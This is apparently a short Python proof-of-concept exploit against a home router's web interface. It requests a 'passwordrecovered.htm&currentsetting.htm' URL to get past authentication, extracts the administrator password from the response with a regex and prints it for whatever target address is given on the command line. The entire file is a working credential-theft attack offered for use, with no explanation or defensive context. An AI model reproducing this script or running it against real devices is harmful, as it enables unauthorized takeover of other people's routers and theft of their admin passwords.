import requests
import re
import sys

#jwmr2010v5.py http://xxx.xxx.xxx.xxx

def showpass(url):
	url = url + '/passwordrecovered.htm&currentsetting.htm'
	header = {}
	res = requests.get(url, headers=header, verify=False, timeout=8)
	index = re.findall(">:\S+<",res.content,re.IGNORECASE)
	print 'admin:'+index[1][8:-1]

if __name__ == "__main__":
	if(sys.argv[1]):
		showpass(sys.argv[1])
	else:
		print 'please add command param'
